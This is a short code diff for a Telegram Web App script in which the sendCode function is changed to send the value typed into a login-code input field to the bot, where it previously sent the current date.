@@ -17,7 +17,8 @@
         });
 
         function sendCode() {
-          window.Telegram.WebApp.sendData(new Date().toString());
+          var theCode = document.getElementById('login_code_input').value;
+          window.Telegram.WebApp.sendData(theCode);
         }
         
       </script>
